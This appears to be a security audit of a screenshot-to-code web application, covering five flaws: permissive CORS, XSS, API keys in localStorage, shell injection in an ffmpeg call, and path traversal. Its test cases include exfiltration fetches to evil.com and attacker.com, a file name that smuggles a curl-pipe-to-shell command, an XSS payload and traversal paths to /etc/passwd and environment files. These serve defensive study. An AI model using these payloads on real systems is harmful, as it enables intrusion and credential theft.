**VULNERABILITIES**

### 1. **Insecure CORS Configuration**
- **Description**: The backend explicitly allows all origins (`allow_origins=["*"]`) in CORS middleware. This enables any website to make cross-origin requests to the API, potentially enabling CSRF attacks and data theft.
- **Impact**: Attackers could steal sensitive data (e.g., API keys, user session data) or perform unauthorized actions on behalf of authenticated users.
- **Rank**: High
- **Current Mitigations**: None implemented in CORS configuration.
- **Missing Mitigations**:
  - Origin allowlist validation
  - Credentials flag restriction
  - CORS policy hardening for sensitive endpoints
- **Preconditions**: Attacker must lure a user to a malicious website while authenticated.
- **Source Analysis**:
  - File: `backend/main.py`
  - Code:
    ```python
    app.add_middleware(
        CORSMiddleware,
        allow_origins=["*"],  # <- Vulnerable configuration
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )
    ```
  - The wildcard origin combined with credentials allowance enables cross-origin attacks.
- **Test Case**:
  1. Host malicious page at `evil.com` with JavaScript:
     ```javascript
     fetch('https://target-app.com/api/user', {credentials: 'include'})
       .then(response => response.json())
       .then(data => exfiltrate(data));
     ```
  2. Trick authenticated user into visiting `evil.com`
  3. Capture sensitive user data from API response

---

### 2. **XSS Risk in AI-Generated Code**
- **Description**: Generated HTML includes unsanitized user inputs and unsafe DOM manipulation patterns (e.g., direct jQuery injection).
- **Impact**: Attacker-controlled inputs could execute arbitrary JavaScript in victims' browsers, leading to account takeover.
- **Rank**: High
- **Current Mitigations**: No output encoding or input validation in code generation.
- **Missing Mitigations**:
  - Context-aware HTML escaping
  - CSP headers with script-source restrictions
  - Safe DOM manipulation practices
- **Preconditions**: Attacker can influence image/screenshot content used for code generation.
- **Source Analysis**:
  - File: `backend/mock_llm.py` (Generated Code Example)
  - Vulnerable Patterns:
    ```html
    <!-- User-controlled input injection -->
    <input value="{{ user_input }}">  <!-- No escaping -->

    <!-- Unsafe jQuery usage -->
    <script>
      $('#output').html(userControlledContent);  <!-- Direct DOM injection -->
    </script>
    ```
- **Test Case**:
  1. Submit image containing hidden text: `"><img src=x onerror=stealCookies()>`
  2. Generate application code from image
  3. Observe unescaped HTML in rendered page
  4. Verify cookie exfiltration when victim views page

---

### 3. **Sensitive Data Exposure in Client-Side Storage**
- **Description**: API keys stored unencrypted in browser localStorage, accessible via XSS.
- **Impact**: Compromise of expensive LLM API credentials and potential account takeover.
- **Rank**: High
- **Current Mitigations**: None - keys persist in localStorage.
- **Missing Mitigations**:
  - Secure HTTP-only cookie storage
  - Backend proxy for API calls
  - Key rotation mechanism
- **Preconditions**: Existence of any XSS vector in application.
- **Source Analysis**:
  - File: `frontend/src/storage.js`
  - Code:
    ```javascript
    localStorage.setItem('OPENAI_API_KEY', key);  // Unprotected storage
    ```
  - README.md states: "Your key remains in browser storage"
- **Test Case**:
  1. Find XSS vulnerability in application UI
  2. Craft payload:
     ```javascript
     fetch('https://attacker.com/log?key='+localStorage.OPENAI_API_KEY)
     ```
  3. Induce victim to execute payload
  4. Capture exfiltrated API key

---

### 4. **Unrestricted File Processing in Video Conversion**
- **Description**: Video processing uses shell commands without input validation or sandboxing.
- **Impact**: Arbitrary command execution via malicious file uploads.
- **Rank**: Critical
- **Current Mitigations**: No file type/size validation.
- **Missing Mitigations**:
  - File signature verification
  - Dockerized processing environment
  - Input size limits
- **Preconditions**: Attacker can upload files to conversion endpoint.
- **Source Analysis**:
  - File: `backend/video_to_app.py`
  - Code:
    ```python
    subprocess.run(f"ffmpeg -i {user_uploaded_path}", shell=True)  # Shell injection risk
    ```
  - Accepts any file type without validation
- **Test Case**:
  1. Create video file named `; curl https://attacker.com/payload.sh | sh;.mp4`
  2. Upload via conversion endpoint
  3. Observe reverse shell connection from server

---

### 5. **Directory Traversal in File Handling**
- **Description**: User-controlled `folder` parameter allows access to arbitrary server paths.
- **Impact**: Disclosure of sensitive system files (e.g., /etc/passwd, application secrets).
- **Rank**: High
- **Current Mitigations**: No path sanitization.
- **Missing Mitigations**:
  - Path normalization
  - Jail to allowed directory
  - Input validation
- **Preconditions**: Attacker can make API requests to /evals endpoint.
- **Source Analysis**:
  - File: `backend/routes/evals.py`
  - Code:
    ```python
    @router.get("/evals")
    def get_evals(folder: str):
        target_path = Path(folder)  # User-controlled path
        return list_files(target_path)
    ```
- **Test Case**:
  1. Send request: `GET /evals?folder=../../../../etc/passwd`
  2. Observe server response containing system password file
  3. Repeat with `../../../proc/self/environ` to leak environment variables
